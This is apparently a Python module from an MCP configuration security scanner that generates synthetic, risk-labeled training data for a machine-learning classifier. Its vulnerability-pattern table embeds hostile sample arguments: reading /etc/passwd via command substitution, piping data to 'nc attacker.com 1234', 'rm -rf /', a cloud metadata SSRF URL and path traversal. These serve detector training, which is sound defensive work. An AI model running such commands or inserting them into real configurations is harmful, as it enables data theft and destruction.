"""Training data generation for MCP security ML models.

This module provides:
1. Labeled training data schema
2. Synthetic data generator based on known vulnerability patterns
3. Data augmentation for imbalanced classes
4. Real-world data ingestion utilities

Patent-relevant innovation: Novel training data synthesis approach that
generates security-relevant MCP configurations based on OWASP MCP Top 10
vulnerability patterns and real-world CVE characteristics.
"""

from __future__ import annotations

import json
import random
import hashlib
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

import numpy as np

from mcpscan.ml.features import MCPFeatures, FeatureExtractor
from mcpscan.models import MCPConfig, MCPServer, MCPTool as Tool


class RiskLabel(str, Enum):
    """Risk level labels for training data."""

    CRITICAL = "critical"  # Score 0.8-1.0
    HIGH = "high"          # Score 0.6-0.8
    MEDIUM = "medium"      # Score 0.4-0.6
    LOW = "low"            # Score 0.2-0.4
    MINIMAL = "minimal"    # Score 0.0-0.2

    @property
    def numeric_value(self) -> int:
        """Return numeric label for classification."""
        return {
            RiskLabel.MINIMAL: 0,
            RiskLabel.LOW: 1,
            RiskLabel.MEDIUM: 2,
            RiskLabel.HIGH: 3,
            RiskLabel.CRITICAL: 4,
        }[self]

    @property
    def score_range(self) -> Tuple[float, float]:
        """Return score range for this risk level."""
        return {
            RiskLabel.MINIMAL: (0.0, 0.2),
            RiskLabel.LOW: (0.2, 0.4),
            RiskLabel.MEDIUM: (0.4, 0.6),
            RiskLabel.HIGH: (0.6, 0.8),
            RiskLabel.CRITICAL: (0.8, 1.0),
        }[self]


@dataclass
class TrainingSample:
    """A single training sample with features and label."""

    features: MCPFeatures
    label: RiskLabel
    score: float  # Continuous score 0.0-1.0
    config_id: str  # Unique identifier
    source: str  # "synthetic", "real", "augmented"
    vulnerability_types: List[str] = field(default_factory=list)
    metadata: Dict[str, Any] = field(default_factory=dict)

    def to_feature_vector(self) -> List[float]:
        """Convert to numeric feature vector."""
        return self.features.to_vector()

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for serialization."""
        return {
            "config_id": self.config_id,
            "label": self.label.value,
            "score": self.score,
            "source": self.source,
            "vulnerability_types": self.vulnerability_types,
            "features": self.features.to_dict(),
            "metadata": self.metadata,
        }


@dataclass
class TrainingDataset:
    """Collection of training samples with utilities."""

    samples: List[TrainingSample] = field(default_factory=list)
    feature_names: List[str] = field(default_factory=list)

    def __post_init__(self):
        if not self.feature_names:
            self.feature_names = MCPFeatures.feature_names()

    def add_sample(self, sample: TrainingSample) -> None:
        """Add a training sample."""
        self.samples.append(sample)

    def get_X_y(self) -> Tuple[np.ndarray, np.ndarray]:
        """Get feature matrix X and label vector y."""
        X = np.array([s.to_feature_vector() for s in self.samples])
        y = np.array([s.label.numeric_value for s in self.samples])
        return X, y

    def get_X_y_scores(self) -> Tuple[np.ndarray, np.ndarray]:
        """Get feature matrix X and continuous score vector y."""
        X = np.array([s.to_feature_vector() for s in self.samples])
        y = np.array([s.score for s in self.samples])
        return X, y

    def class_distribution(self) -> Dict[str, int]:
        """Get distribution of classes."""
        dist = {label.value: 0 for label in RiskLabel}
        for sample in self.samples:
            dist[sample.label.value] += 1
        return dist

    def save(self, path: Path) -> None:
        """Save dataset to JSON file."""
        path.parent.mkdir(parents=True, exist_ok=True)

        data = {
            "feature_names": self.feature_names,
            "samples": [s.to_dict() for s in self.samples],
            "class_distribution": self.class_distribution(),
            "total_samples": len(self.samples),
        }

        with open(path, "w") as f:
            json.dump(data, f, indent=2)

    @classmethod
    def load(cls, path: Path) -> "TrainingDataset":
        """Load dataset from JSON file."""
        with open(path) as f:
            data = json.load(f)

        dataset = cls(feature_names=data["feature_names"])

        for sample_data in data["samples"]:
            features = MCPFeatures(**{
                k: v for k, v in sample_data["features"].items()
                if k in MCPFeatures.__dataclass_fields__ and k not in ["server_names", "detected_platforms"]
            })
            features.server_names = sample_data["features"].get("server_names", [])
            features.detected_platforms = sample_data["features"].get("detected_platforms", [])

            sample = TrainingSample(
                features=features,
                label=RiskLabel(sample_data["label"]),
                score=sample_data["score"],
                config_id=sample_data["config_id"],
                source=sample_data["source"],
                vulnerability_types=sample_data.get("vulnerability_types", []),
                metadata=sample_data.get("metadata", {}),
            )
            dataset.add_sample(sample)

        return dataset


class SyntheticDataGenerator:
    """Generate synthetic training data based on security patterns.

    This generator creates realistic MCP configurations with known
    vulnerability patterns for supervised learning. The patterns are
    derived from:
    1. OWASP MCP Top 10 vulnerability categories
    2. Real-world CVE analysis
    3. Security research on AI agent architectures
    """

    # Vulnerability pattern templates
    VULNERABILITY_PATTERNS = {
        # MCP01: Token/Secret Exposure
        "hardcoded_openai_key": {
            "env": {"OPENAI_API_KEY": "sk-proj-{random_key}"},
            "risk_contribution": 0.3,
            "vulnerability_type": "MCP01_Token_Exposure",
        },
        "hardcoded_anthropic_key": {
            "env": {"ANTHROPIC_API_KEY": "sk-ant-{random_key}"},
            "risk_contribution": 0.3,
            "vulnerability_type": "MCP01_Token_Exposure",
        },
        "hardcoded_github_token": {
            "env": {"GITHUB_TOKEN": "ghp_{random_token}"},
            "risk_contribution": 0.25,
            "vulnerability_type": "MCP01_Token_Exposure",
        },
        "hardcoded_aws_keys": {
            "env": {
                "AWS_ACCESS_KEY_ID": "AKIA{random_aws}",
                "AWS_SECRET_ACCESS_KEY": "{random_secret}",
            },
            "risk_contribution": 0.35,
            "vulnerability_type": "MCP01_Token_Exposure",
        },
        "bearer_token_in_args": {
            "args": ["--token", "Bearer {random_bearer}"],
            "risk_contribution": 0.25,
            "vulnerability_type": "MCP01_Token_Exposure",
        },

        # MCP02: Privilege Escalation
        "sudo_command": {
            "command": "sudo",
            "args": ["{tool_path}"],
            "risk_contribution": 0.35,
            "vulnerability_type": "MCP02_Privilege_Escalation",
        },
        "shell_access_tool": {
            "tools": [{"name": "execute_shell", "description": "Execute shell commands"}],
            "risk_contribution": 0.4,
            "vulnerability_type": "MCP02_Privilege_Escalation",
        },
        "root_execution": {
            "command": "/bin/bash",
            "args": ["-c", "su -c '{command}'"],
            "risk_contribution": 0.4,
            "vulnerability_type": "MCP02_Privilege_Escalation",
        },

        # MCP03: Tool Poisoning (complexity-based)
        "many_remote_tools": {
            "url": "http://{random_domain}:{random_port}/mcp",
            "tools": [
                {"name": f"tool_{i}", "description": f"Remote tool {i}"}
                for i in range(10)
            ],
            "risk_contribution": 0.2,
            "vulnerability_type": "MCP03_Tool_Poisoning",
        },

        # MCP05: Command Injection
        "command_substitution": {
            "args": ["--config", "$(cat /etc/passwd)"],
            "risk_contribution": 0.35,
            "vulnerability_type": "MCP05_Command_Injection",
        },
        "backtick_injection": {
            "args": ["--input", "`whoami`"],
            "risk_contribution": 0.35,
            "vulnerability_type": "MCP05_Command_Injection",
        },
        "pipe_chain": {
            "args": ["--file", "/tmp/data | nc attacker.com 1234"],
            "risk_contribution": 0.3,
            "vulnerability_type": "MCP05_Command_Injection",
        },
        "semicolon_injection": {
            "args": ["--path", "/tmp; rm -rf /"],
            "risk_contribution": 0.35,
            "vulnerability_type": "MCP05_Command_Injection",
        },

        # MCP07: Auth Weakness
        "no_auth_remote": {
            "url": "http://internal-server:8080/mcp",
            "risk_contribution": 0.25,
            "vulnerability_type": "MCP07_Auth_Weakness",
        },
        "http_not_https": {
            "url": "http://api.example.com/mcp",
            "risk_contribution": 0.15,
            "vulnerability_type": "MCP07_Auth_Weakness",
        },

        # SSRF Patterns
        "metadata_endpoint": {
            "args": ["--url", "http://169.254.169.254/latest/meta-data/"],
            "risk_contribution": 0.4,
            "vulnerability_type": "SSRF",
        },
        "internal_network": {
            "url": "http://192.168.1.100:3000/mcp",
            "risk_contribution": 0.2,
            "vulnerability_type": "SSRF",
        },
        "localhost_access": {
            "args": ["--endpoint", "http://localhost:9200/"],
            "risk_contribution": 0.15,
            "vulnerability_type": "SSRF",
        },

        # Path Traversal
        "path_traversal": {
            "args": ["--file", "../../../etc/passwd"],
            "risk_contribution": 0.25,
            "vulnerability_type": "Path_Traversal",
        },
    }

    # Safe configuration templates
    SAFE_PATTERNS = {
        "env_reference": {
            "env": {"API_KEY": "${API_KEY}"},
            "risk_reduction": 0.1,
        },
        "https_endpoint": {
            "url": "https://api.example.com/mcp",
            "risk_reduction": 0.05,
        },
        "auth_configured": {
            "env": {"MCP_AUTH_TOKEN": "${MCP_AUTH_TOKEN}"},
            "args": ["--auth", "oauth2"],
            "risk_reduction": 0.15,
        },
        "scoped_tools": {
            "tools": [
                {"name": "read_file", "description": "Read specific file"},
            ],
            "risk_reduction": 0.05,
        },
    }

    # Common server commands
    SERVER_COMMANDS = [
        "npx",
        "node",
        "python",
        "python3",
        "uvx",
        "/usr/local/bin/mcp-server",
    ]

    # Common tool names
    TOOL_NAMES = [
        "read_file", "write_file", "list_directory",
        "execute_command", "http_request", "query_database",
        "search", "fetch_url", "send_message",
        "create_file", "delete_file", "run_script",
    ]

    def __init__(self, seed: Optional[int] = None):
        """Initialize generator with optional random seed."""
        self.rng = random.Random(seed)
        self.np_rng = np.random.default_rng(seed)
        self.feature_extractor = FeatureExtractor()

    def generate_dataset(
        self,
        n_samples: int = 1000,
        class_balance: Optional[Dict[str, float]] = None,
    ) -> TrainingDataset:
        """Generate a complete training dataset.

        Args:
            n_samples: Total number of samples to generate
            class_balance: Optional class distribution weights

        Returns:
            TrainingDataset with generated samples
        """
        if class_balance is None:
            # Default: slightly imbalanced toward lower risk
            class_balance = {
                "minimal": 0.25,
                "low": 0.25,
                "medium": 0.20,
                "high": 0.15,
                "critical": 0.15,
            }

        dataset = TrainingDataset()

        for label_name, proportion in class_balance.items():
            n_class = int(n_samples * proportion)
            label = RiskLabel(label_name)

            for _ in range(n_class):
                sample = self._generate_sample_for_label(label)
                dataset.add_sample(sample)

        return dataset

    def _generate_sample_for_label(self, target_label: RiskLabel) -> TrainingSample:
        """Generate a sample targeting a specific risk label."""
        min_score, max_score = target_label.score_range
        target_score = self.rng.uniform(min_score, max_score)

        # Build configuration with appropriate risk level
        config = self._build_config_for_score(target_score)

        # Extract features
        features = self.feature_extractor.extract(config)

        # Determine actual score based on features
        actual_score = self._calculate_actual_score(features)

        # Adjust label if actual score differs significantly
        actual_label = self._score_to_label(actual_score)

        config_id = hashlib.md5(
            json.dumps(config.raw_content).encode()
        ).hexdigest()[:12]

        return TrainingSample(
            features=features,
            label=actual_label,
            score=actual_score,
            config_id=config_id,
            source="synthetic",
            vulnerability_types=self._get_vulnerability_types(config),
        )

    def _build_config_for_score(self, target_score: float) -> MCPConfig:
        """Build an MCP config targeting a specific risk score."""
        servers = {}

        # Determine number of servers (1-5)
        n_servers = self.rng.randint(1, min(5, max(1, int(target_score * 5) + 1)))

        vulnerability_budget = target_score

        for i in range(n_servers):
            server_name = f"server_{i}"

            # Decide if local or remote
            is_remote = self.rng.random() < (target_score * 0.5)

            server_config: Dict[str, Any] = {}

            if is_remote:
                # Remote server
                domain = self.rng.choice([
                    "api.example.com",
                    "internal-server",
                    "192.168.1.100",
                    "localhost",
                ])
                port = self.rng.choice([3000, 8080, 8000, 443])
                protocol = "https" if self.rng.random() > target_score else "http"
                server_config["url"] = f"{protocol}://{domain}:{port}/mcp"
            else:
                # Local server
                server_config["command"] = self.rng.choice(self.SERVER_COMMANDS)
                server_config["args"] = [f"mcp-server-{server_name}"]

            # Add environment variables
            server_config["env"] = {}

            # Add vulnerabilities based on budget
            while vulnerability_budget > 0.1:
                pattern_name = self.rng.choice(list(self.VULNERABILITY_PATTERNS.keys()))
                pattern = self.VULNERABILITY_PATTERNS[pattern_name]

                if pattern["risk_contribution"] <= vulnerability_budget:
                    self._apply_pattern(server_config, pattern)
                    vulnerability_budget -= pattern["risk_contribution"]

                # Random chance to stop adding vulnerabilities
                if self.rng.random() > 0.7:
                    break

            # Add safe patterns for lower risk configs
            if target_score < 0.4:
                for _ in range(self.rng.randint(1, 3)):
                    safe_pattern = self.rng.choice(list(self.SAFE_PATTERNS.values()))
                    self._apply_pattern(server_config, safe_pattern)

            # Add tools
            n_tools = self.rng.randint(0, int(target_score * 10) + 2)
            tools = []
            for j in range(n_tools):
                tool_name = self.rng.choice(self.TOOL_NAMES)
                tools.append({
                    "name": f"{tool_name}_{j}",
                    "description": f"Tool for {tool_name.replace('_', ' ')}",
                })
            server_config["tools"] = tools

            servers[server_name] = MCPServer(
                name=server_name,
                command=server_config.get("command"),
                args=server_config.get("args", []),
                env=server_config.get("env", {}),
                url=server_config.get("url"),
                tools=[
                    Tool(name=t["name"], description=t.get("description"))
                    for t in server_config.get("tools", [])
                ],
                raw_config=server_config,
            )

        raw_content = json.dumps({"mcpServers": {
            name: server.raw_config for name, server in servers.items()
        }})

        return MCPConfig(
            file_path="synthetic_config.json",
            servers=servers,
            raw_content=raw_content,
        )

    def _apply_pattern(self, config: Dict[str, Any], pattern: Dict[str, Any]) -> None:
        """Apply a vulnerability or safe pattern to a config."""
        for key, value in pattern.items():
            if key in ["risk_contribution", "risk_reduction", "vulnerability_type"]:
                continue

            if key == "env":
                config.setdefault("env", {})
                for env_key, env_val in value.items():
                    config["env"][env_key] = self._fill_template(env_val)

            elif key == "args":
                config.setdefault("args", [])
                for arg in value:
                    config["args"].append(self._fill_template(arg))

            elif key == "command":
                config["command"] = self._fill_template(value)

            elif key == "url":
                config["url"] = self._fill_template(value)

            elif key == "tools":
                config.setdefault("tools", [])
                config["tools"].extend(value)

    def _fill_template(self, template: str) -> str:
        """Fill in template placeholders with random values."""
        replacements = {
            "{random_key}": self._random_string(40),
            "{random_token}": self._random_string(36),
            "{random_aws}": self._random_string(16, uppercase=True),
            "{random_secret}": self._random_string(40),
            "{random_bearer}": self._random_string(50),
            "{random_domain}": self.rng.choice([
                "api.service.com", "internal.corp.net", "192.168.1.50"
            ]),
            "{random_port}": str(self.rng.choice([3000, 8080, 8000, 9000])),
            "{tool_path}": "/usr/local/bin/mcp-tool",
            "{command}": "echo test",
        }

        result = template
        for placeholder, value in replacements.items():
            result = result.replace(placeholder, value)

        return result

    def _random_string(self, length: int, uppercase: bool = False) -> str:
        """Generate a random alphanumeric string."""
        chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" if uppercase else \
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        return "".join(self.rng.choice(chars) for _ in range(length))

    def _calculate_actual_score(self, features: MCPFeatures) -> float:
        """Calculate actual risk score from features."""
        score = 0.0

        # Credential exposure (highest weight)
        score += min(1.0, features.num_hardcoded_secrets * 0.15)
        score += min(0.5, features.num_api_key_patterns * 0.12)
        score += min(0.3, features.sensitive_env_exposure * 0.1)

        # Injection risks
        score += min(0.4, features.num_command_injection_patterns * 0.15)
        score += min(0.2, features.num_shell_metacharacters * 0.02)
        score += min(0.2, features.num_path_traversal_patterns * 0.1)

        # Network/SSRF risks
        score += min(0.3, features.num_internal_urls * 0.08)
        score += min(0.4, features.num_metadata_endpoints * 0.2)

        # Tool risks
        score += min(0.3, features.num_dangerous_tools * 0.08)
        score += 0.15 if features.has_privileged_tools else 0.0
        score += min(0.2, features.num_exec_tools * 0.07)

        # Structural risks
        score += 0.1 if features.has_remote_servers else 0.0
        score += min(0.1, features.config_complexity / 100 * 0.05)

        # Auth weaknesses
        if features.has_remote_servers and not features.has_auth_indicators:
            score += 0.15

        # Mitigating factors
        if features.uses_env_references:
            score *= 0.9
        if features.has_auth_indicators:
            score *= 0.85

        return min(1.0, max(0.0, score))

    def _score_to_label(self, score: float) -> RiskLabel:
        """Convert numeric score to risk label."""
        if score >= 0.8:
            return RiskLabel.CRITICAL
        elif score >= 0.6:
            return RiskLabel.HIGH
        elif score >= 0.4:
            return RiskLabel.MEDIUM
        elif score >= 0.2:
            return RiskLabel.LOW
        else:
            return RiskLabel.MINIMAL

    def _get_vulnerability_types(self, config: MCPConfig) -> List[str]:
        """Extract vulnerability types present in config."""
        types = set()

        for server in config.servers.values():
            config_str = json.dumps(server.raw_config).lower()

            if any(k in config_str for k in ["sk-", "ghp_", "akia", "bearer"]):
                types.add("MCP01_Token_Exposure")

            if any(k in config_str for k in ["sudo", "shell", "exec", "root"]):
                types.add("MCP02_Privilege_Escalation")

            if any(k in config_str for k in ["$(", "`", "|", ";"]):
                types.add("MCP05_Command_Injection")

            if server.url and "http://" in (server.url or ""):
                if "localhost" in server.url or "192.168" in server.url:
                    types.add("SSRF")
                if "169.254.169.254" in config_str:
                    types.add("SSRF")

            if ".." in config_str:
                types.add("Path_Traversal")

        return list(types)


class RealDataIngester:
    """Ingest and label real-world MCP configurations."""

    def __init__(self):
        self.feature_extractor = FeatureExtractor()

    def ingest_file(
        self,
        path: Path,
        label: Optional[RiskLabel] = None,
    ) -> Optional[TrainingSample]:
        """Ingest a single MCP config file.

        Args:
            path: Path to config file
            label: Optional manual label (auto-labeled if not provided)

        Returns:
            TrainingSample or None if file is invalid
        """
        try:
            content = path.read_text()
            data = json.loads(content)

            servers = data.get("mcpServers", data.get("servers", {}))
            if not servers:
                return None

            mcp_config = MCPConfig(
                file_path=str(path),
                servers={
                    name: MCPServer(
                        name=name,
                        command=s.get("command"),
                        args=s.get("args", []),
                        env=s.get("env", {}),
                        url=s.get("url"),
                        tools=[
                            Tool(name=t.get("name", ""), description=t.get("description"))
                            for t in s.get("tools", [])
                        ],
                        raw_config=s,
                    )
                    for name, s in servers.items()
                },
                raw_content=content,
            )

            features = self.feature_extractor.extract(mcp_config)

            # Calculate score for auto-labeling
            generator = SyntheticDataGenerator()
            score = generator._calculate_actual_score(features)

            if label is None:
                label = generator._score_to_label(score)

            config_id = hashlib.md5(content.encode()).hexdigest()[:12]

            return TrainingSample(
                features=features,
                label=label,
                score=score,
                config_id=config_id,
                source="real",
                vulnerability_types=generator._get_vulnerability_types(mcp_config),
                metadata={"file_path": str(path)},
            )

        except Exception:
            return None

    def ingest_directory(
        self,
        directory: Path,
        patterns: Optional[List[str]] = None,
    ) -> TrainingDataset:
        """Ingest all MCP configs from a directory.

        Args:
            directory: Directory to scan
            patterns: Glob patterns for config files

        Returns:
            TrainingDataset with ingested samples
        """
        if patterns is None:
            patterns = [
                "**/mcp.json",
                "**/.mcp.json",
                "**/mcp_config.json",
                "**/claude_desktop_config.json",
                "**/.cursor/mcp.json",
            ]

        dataset = TrainingDataset()

        for pattern in patterns:
            for path in directory.glob(pattern):
                sample = self.ingest_file(path)
                if sample:
                    dataset.add_sample(sample)

        return dataset
